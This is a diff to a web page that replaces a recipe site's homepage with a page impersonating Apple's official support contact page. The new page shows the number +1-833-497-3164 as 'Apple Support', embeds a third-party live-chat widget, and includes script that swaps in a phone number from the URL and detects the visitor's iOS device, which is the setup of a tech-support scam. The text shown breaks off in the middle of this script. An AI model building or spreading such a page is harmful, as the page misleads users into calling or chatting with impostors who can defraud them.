@@ -1,515 +1,388 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ember Pantry Mosaic · recipe authority</title>
-  <!-- Font & minimal style, unique typography -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Source+Serif+Pro:opsz,wght@14..32,400;14..32,600;14..32,700&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Inter', sans-serif;
-      background-color: #f9f5f0;
-      color: #2a241e;
-      line-height: 1.7;
-      padding: 0 1.5rem;
-    }
-    .container {
-      max-width: 1240px;
-      margin: 0 auto;
-      padding: 1.5rem 0 3rem;
-    }
-    /* unique spacing & card design */
-    h1, h2, h3, h4 {
-      font-family: 'Source Serif Pro', serif;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      line-height: 1.2;
-      margin-top: 2rem;
-      margin-bottom: 0.75rem;
-    }
-    h1 {
-      font-size: 2.8rem;
-      font-weight: 700;
-      letter-spacing: -0.03em;
-    }
-    h2 {
-      font-size: 2rem;
-      border-bottom: 2px solid #d8cdc0;
-      padding-bottom: 0.4rem;
-      margin-top: 3rem;
-    }
-    h3 {
-      font-size: 1.5rem;
-      margin-top: 1.8rem;
-    }
-    p {
-      margin-bottom: 1.25rem;
-      font-weight: 350;
-      max-width: 75ch;
-    }
-    a {
-      color: #8b5e3c;
-      text-decoration: none;
-      font-weight: 500;
-      border-bottom: 1px dotted #d4bfae;
-    }
-    a:hover {
-      color: #4c3522;
-      border-bottom: 2px solid #8b5e3c;
-    }
-    .btn {
-      display: inline-block;
-      background: #2a241e;
-      color: #f9f5f0;
-      padding: 0.6rem 1.6rem;
-      border-radius: 40px;
-      font-weight: 500;
-      letter-spacing: 0.3px;
-      border: none;
-      font-size: 0.95rem;
-      transition: 0.2s;
-      border-bottom: none;
-    }
-    .btn:hover {
-      background: #4f3f32;
-      color: #fff;
-      border-bottom: none;
-    }
-    .btn-outline {
-      background: transparent;
-      border: 1px solid #2a241e;
-      color: #2a241e;
-    }
-    .btn-outline:hover {
-      background: #2a241e;
-      color: #f9f5f0;
-    }
-    /* header / navigation */
-    .site-header {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      padding: 1.5rem 0 1rem;
-      border-bottom: 2px solid #e1d5c9;
-      margin-bottom: 2rem;
-    }
-    .logo {
-      font-family: 'Source Serif Pro', serif;
-      font-size: 1.9rem;
-      font-weight: 700;
-      letter-spacing: -0.02em;
-      color: #3b2c1e;
-    }
-    .logo span {
-      color: #9d7a5c;
-      font-weight: 400;
-    }
-    .nav-links {
-      display: flex;
-      gap: 2rem;
-      font-size: 0.95rem;
-      font-weight: 500;
-    }
-    .nav-links a {
-      border-bottom: none;
-      color: #3b2c1e;
-    }
-    .nav-links a:hover {
-      color: #8b5e3c;
-      border-bottom: 2px solid #8b5e3c;
-    }
-    /* hero – detailed intro */
-    .hero {
-      background: #eee7df;
-      padding: 2.8rem 2.8rem;
-      border-radius: 40px;
-      margin-bottom: 3.5rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.02);
-    }
-    .hero-content {
-      flex: 2;
-      min-width: 280px;
-    }
-    .hero-content h1 {
-      margin-top: 0;
-      font-size: 2.6rem;
-    }
-    .hero-content p {
-      font-size: 1.1rem;
-      max-width: 90%;
-    }
-    .hero-image {
-      flex: 1;
-      min-width: 140px;
-      text-align: right;
-    }
-    .hero-image img {
-      max-width: 100%;
-      border-radius: 60px 20px 60px 20px;
-      box-shadow: 0 12px 24px -8px rgba(0,0,0,0.1);
-    }
-    .featured-topics {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.7rem 1.2rem;
-      margin-top: 1.2rem;
-    }
-    .featured-topics span {
-      background: #ffffffd0;
-      padding: 0.3rem 1.2rem;
-      border-radius: 40px;
-      font-size: 0.8rem;
-      font-weight: 600;
-      letter-spacing: 0.3px;
-      border: 1px solid #d3c3b4;
-    }
-    /* card layout – unique cards */
-    .card-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(270px, 1fr));
-      gap: 2rem;
-      margin: 2rem 0 2.5rem;
-    }
-    .card {
-      background: #fffcf8;
-      border-radius: 28px;
-      padding: 1.8rem 1.6rem 1.8rem;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.02);
-      transition: 0.2s ease;
-      border: 1px solid #ede5db;
-      display: flex;
-      flex-direction: column;
-    }
-    .card:hover {
-      transform: translateY(-4px);
-      border-color: #cbb7a6;
-      box-shadow: 0 14px 28px -8px rgba(80, 60, 40, 0.08);
-    }
-    .card .card-tag {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      background: #e5d9ce;
-      padding: 0.2rem 0.9rem;
-      border-radius: 30px;
-      display: inline-block;
-      margin-bottom: 0.7rem;
-      align-self: flex-start;
-      color: #2f251e;
-    }
-    .card h3 {
-      margin-top: 0.2rem;
-      font-size: 1.4rem;
-    }
-    .card p {
-      font-size: 0.95rem;
-      color: #3d352e;
-      flex: 1;
-    }
-    .card .meta {
-      font-size: 0.8rem;
-      color: #7d6b5b;
-      margin-top: 0.8rem;
-      border-top: 1px solid #e7dbd0;
-      padding-top: 0.8rem;
-    }
-    .card img {
-      width: 100%;
-      border-radius: 20px;
-      margin-bottom: 1rem;
-      max-height: 160px;
-      object-fit: cover;
-    }
-    /* two-col layout for guides / resources */
-    .two-col {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2.5rem;
-      margin: 2.5rem 0;
-    }
-    .col-box {
-      background: #fcf8f4;
-      padding: 1.8rem 2rem;
-      border-radius: 32px;
-      border: 1px solid #e6dbd1;
-    }
-    .col-box ul, .col-box ol {
-      margin-left: 1.2rem;
-      margin-bottom: 0.5rem;
-    }
-    .col-box li {
-      margin-bottom: 0.4rem;
-    }
-    /* table / comparison */
-    .table-wrap {
-      overflow-x: auto;
-      margin: 2rem 0;
-      background: #fcf8f4;
-      border-radius: 28px;
-      border: 1px solid #e3d7cb;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 0.95rem;
-    }
-    th {
-      background: #e7dbd0;
-      text-align: left;
-      padding: 0.8rem 1.2rem;
-      font-weight: 600;
-    }
-    td {
-      padding: 0.8rem 1.2rem;
-      border-bottom: 1px solid #e3d7cb;
-    }
-    tr:last-child td {
-      border-bottom: none;
-    }
-    /* FAQ */
-    .faq-item {
-      border-bottom: 1px solid #ddd0c3;
-      padding: 1rem 0;
-    }
-    .faq-item strong {
-      display: block;
-      font-size: 1.05rem;
-      font-weight: 600;
-      margin-bottom: 0.2rem;
-    }
-    .faq-item p {
-      margin-bottom: 0.3rem;
-    }
-    /* newsletter */
-    .newsletter {
-      background: #e1d3c6;
-      padding: 2.5rem 2.5rem;
-      border-radius: 60px 20px 60px 20px;
-      margin: 3.5rem 0 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .newsletter h3 {
-      margin: 0;
-      font-size: 1.8rem;
-      font-weight: 600;
-    }
-    .newsletter p {
-      margin: 0.5rem 0 0;
-      max-width: 70%;
-    }
-    .newsletter .btn {
-      background: #2a241e;
-    }
-    .newsletter .btn:hover {
-      background: #4f3f32;
-    }
-    /* footer */
-    .footer {
-      border-top: 2px solid #ddd0c3;
-      padding: 2.5rem 0 1rem;
-      margin-top: 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      font-size: 0.9rem;
-      color: #5b4d3f;
-    }
-    .footer a {
-      border-bottom: none;
-      color: #5b4d3f;
-    }
-    .footer a:hover {
-      color: #2a241e;
-      border-bottom: 1px solid #2a241e;
-    }
-    /* responsive */
-    @media (max-width: 700px) {
-      body { padding: 0 0.8rem; }
-      h1 { font-size: 2rem; }
-      .hero { padding: 1.8rem; }
-      .two-col { grid-template-columns: 1fr; }
-      .nav-links { gap: 1rem; flex-wrap: wrap; }
-      .hero-image { margin-top: 1.2rem; }
-      .newsletter { flex-direction: column; align-items: flex-start; gap: 1rem; }
-    }
-    /* minimal images, content-first */
-    img {
-      max-width: 100%;
-      display: block;
-    }
-    hr {
-      border: none;
-      border-top: 2px dashed #d3c3b4;
-      margin: 2.5rem 0;
-    }
-  </style>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+
+
+
+
+	<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-6cfbZTytOxFzT_D8G_htA.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
 </head>
+
 <body>
-<div class="container">
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!-- header -->
-  <header class="site-header">
-    <div class="logo">Ember <span>Pantry Mosaic</span></div>
-    <div class="nav-links">
-   <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-833-497-3164 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-  </header>
 
-  <!-- hero section : detailed intro + niche overview -->
-  <div class="hero">
-    <div class="hero-content">
-      <h1>Where recipe wisdom meets craft</h1>
-      <p>Ember Pantry Mosaic is an independent recipe authority — devoted to technique, tradition, and the quiet alchemy of cooking. From heirloom grains to modern fermentation, we explore the layered stories behind every dish.</p>
-      <div class="featured-topics">
-        <span>fermentation</span>
-        <span>sourdough</span>
-        <span>seasonal produce</span>
-        <span>heritage grains</span>
-        <span>preserving</span>
-      </div>
-    </div>
-    <div class="hero-image">
-      <!-- hero image 1/4 -->
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='240' height='180' viewBox='0 0 240 180'%3E%3Crect width='240' height='180' fill='%23d6c5b6'/%3E%3Ccircle cx='120' cy='90' r='48' fill='%23b09782'/%3E%3Ccircle cx='120' cy='90' r='24' fill='%23947b66'/%3E%3C/svg%3E" alt="Ember Pantry Mosaic – artisan cooking" style="max-width:220px;">
-    </div>
-  </div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-497-3164
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-  <!-- featured articles (2 cards) -->
-  <h2>Featured articles</h2>
-  <div class="card-grid">
-    <div class="card">
-      <span class="card-tag">technique</span>
-      <!-- featured article image 2/4 -->
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='180' viewBox='0 0 400 180'%3E%3Crect width='400' height='180' fill='%23dacebf'/%3E%3Cpath d='M50 90 L100 40 L160 80 L220 30 L280 70 L340 40 L380 80 L380 140 L50 140Z' fill='%239a816b' opacity='0.6'/%3E%3C/svg%3E" alt="fermentation feature">
-      <h3>The art of wild fermentation</h3>
-      <p>Beyond kraut: how to build a living pantry with brine, whey, and time. A deep guide to vegetable ferments, from kimchi to summer pickles.</p>
-      <div class="meta">9 min read · 12 Jan 2026</div>
-    </div>
-    <div class="card">
-      <span class="card-tag">guide</span>
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='180' viewBox='0 0 400 180'%3E%3Crect width='400' height='180' fill='%23d4c2b2'/%3E%3Ccircle cx='120' cy='80' r='40' fill='%239f8979'/%3E%3Ccircle cx='280' cy='80' r='30' fill='%23b29985'/%3E%3C/svg%3E" alt="sourdough guide">
-      <h3>Mastering sourdough: hydration & rhythm</h3>
-      <p>From stiff starter to lacy crumb — learn to read your dough, control fermentation, and bake loaves that sing with character.</p>
-      <div class="meta">14 min read · 5 Jan 2026</div>
-    </div>
-  </div>
 
-  <!-- beginner guides + expert resources (two-col) -->
-  <div class="two-col">
-    <div class="col-box">
-      <h3 style="margin-top:0;">🌟 Beginner guides</h3>
-      <ul>
-        <li><a href="#">First sourdough: a 7-day roadmap</a></li>
-        <li><a href="#">Knife skills: the claw & the rock</a></li>
-        <li><a href="#">How to season cast iron (once and for all)</a></li>
-        <li><a href="#">Pantry staples: rice, beans, and beyond</a></li>
-      </ul>
-    </div>
-    <div class="col-box">
-      <h3 style="margin-top:0;">🧑‍🍳 Expert resources</h3>
-      <ul>
-        <li><a href="#">Hydration calculators & baker’s percentages</a></li>
-        <li><a href="#">Flavor layering: umami, acid, heat</a></li>
-        <li><a href="#">Fermentation logs and pH tracking</a></li>
-        <li><a href="#">Whole grain milling at home</a></li>
-      </ul>
-    </div>
-  </div>
 
-  <!-- popular categories + trending topics (compact) -->
-  <div style="display:flex; flex-wrap:wrap; gap:1.5rem 3rem; background:#f6efe8; padding:1.8rem 2rem; border-radius:40px; margin:2rem 0;">
-    <div><strong style="font-size:1.2rem;">📂 Categories</strong><br> 
-      <span style="display:inline-block; margin-top:0.5rem; background:#fff; padding:0.2rem 1.2rem; border-radius:40px;">Ferments</span>
-      <span style="display:inline-block; margin-top:0.5rem; background:#fff; padding:0.2rem 1.2rem; border-radius:40px;">Sourdough</span>
-      <span style="display:inline-block; margin-top:0.5rem; background:#fff; padding:0.2rem 1.2rem; border-radius:40px;">Seasonal</span>
-      <span style="display:inline-block; margin-top:0.5rem; background:#fff; padding:0.2rem 1.2rem; border-radius:40px;">Preserves</span>
-    </div>
-    <div><strong style="font-size:1.2rem;">🔥 Trending</strong><br>
-      <span style="display:inline-block; margin-top:0.5rem;">· Sourdough discard recipes</span><br>
-      <span style="display:inline-block;">· Quick pickles 3 ways</span><br>
-      <span style="display:inline-block;">· Ancient grains guide</span>
-    </div>
-  </div>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-  <!-- latest articles (3 cards) -->
-  <h2>Latest from the pantry</h2>
-  <div class="card-grid">
-    <div class="card"><span class="card-tag">recipe</span><h3>Barley & mushroom stew</h3><p>A humble, deeply savory bowl with pearl barley, dried porcini, and caramelized onions. Perfect for winter nights.</p><div class="meta">6 Jan 2026</div></div>
-    <div class="card"><span class="card-tag">technique</span><h3>Salt‑brining for moisture</h3><p>Dry vs wet brine — and why equilibrium brining gives you juicy chicken, pork, and even vegetables.</p><div class="meta">3 Jan 2026</div></div>
-    <div class="card"><span class="card-tag">guide</span><h3>Building a sourdough starter</h3><p>Day-by-day visual guide: from flour + water to bubbly, active starter. Troubleshooting included.</p><div class="meta">30 Dec 2025</div></div>
-  </div>
 
-  <!-- in-depth tutorials: comparison table & checklist -->
-  <h2>In‑depth tutorials</h2>
-  <div class="table-wrap">
-    <table>
-      <tr><th>Method</th><th>Time</th><th>Best for</th><th>Difficulty</th></tr>
-      <tr><td>Wild fermentation (brine)</td><td>5–14 days</td><td>Vegetables, kraut</td><td>Intermediate</td></tr>
-      <tr><td>Quick pickling (vinegar)</td><td>1–4 hours</td><td>Quick sides, onions</td><td>Beginner</td></tr>
-      <tr><td>Sourdough long fermentation</td><td>12–48h</td><td>Artisan bread, pizza</td><td>Advanced</td></tr>
-    </table>
-  </div>
-  <div style="background:#f5ede5; padding:1.2rem 2rem; border-radius:40px; margin:1.5rem 0;">
-    <strong>📋 Checklist for your first sourdough</strong>
-    <ul style="margin-top:0.6rem; columns:2; column-gap:2rem;">
-      <li>✓ Starter 7 days old</li>
-      <li>✓ Whole wheat & bread flour</li>
-      <li>✓ Digital scale</li>
-      <li>✓ Banneton or bowl</li>
-      <li>✓ Dutch oven</li>
-      <li>✓ Patience</li>
-    </ul>
-  </div>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-  <!-- resource hub (curated) -->
-  <h2>Resource hub</h2>
-  <div style="display:flex; flex-wrap:wrap; gap:1rem 2rem; background:#fcf8f4; padding:1.5rem 2rem; border-radius:40px; margin:1rem 0 2rem;">
-    <div><strong>📖 Books</strong><br> <span style="font-size:0.95rem;">Tartine · Nourishing Traditions · Flour Water Salt Yeast</span></div>
-    <div><strong>🔧 Tools</strong><br> <span style="font-size:0.95rem;">Bench scraper · crock · cambro · thermometer</span></div>
-    <div><strong>🌾 Mills</strong><br> <span style="font-size:0.95rem;">Mockmill · Komo · hand mills</span></div>
-  </div>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-  <!-- FAQ (structured for schema) -->
-  <h2>Frequently asked questions</h2>
-  <div class="faq-item"><strong>What’s the best flour for sourdough?</strong><p>Bread flour or a mix of whole wheat and strong white flour. Freshly milled grains add incredible depth.</p></div>
-  <div class="faq-item"><strong>How do I keep my starter healthy?</strong><p>Feed regularly, store at room temp or fridge, and use unchlorinated water. A consistent feeding schedule builds strength.</p></div>
-  <div class="faq-item"><strong>Can I ferment without salt?</strong><p>Salt controls undesirable bacteria and improves texture. For salt‑free ferments, consider using whey or a starter culture.</p></div>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-  <!-- newsletter -->
-  <div class="newsletter">
-    <div><h3>📬 The Mosaic Letter</h3><p>Weekly recipes, techniques, and stories from our kitchen. No spam, just substance.</p></div>
-    <a href="#" class="btn">Subscribe</a>
-  </div>
+        window.number = getPar('phone');
 
-  <!-- footer -->
-  <footer class="footer">
-    <div>© 2026 Ember Pantry Mosaic · recipe authority</div>
-    <div>
-      <a href="#">About</a> · <a href="#">Contact</a> · <a href="#">Privacy</a> · <a href="#">Newsletter</a>
-    </div>
-  </footer>
-</div>
-<!-- minimal images used: hero image, featured article image, category image (inline), no extra -->
-</body>
-</html>
+        window.number = (window.number ? window.number : '+1-833-497-3164');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
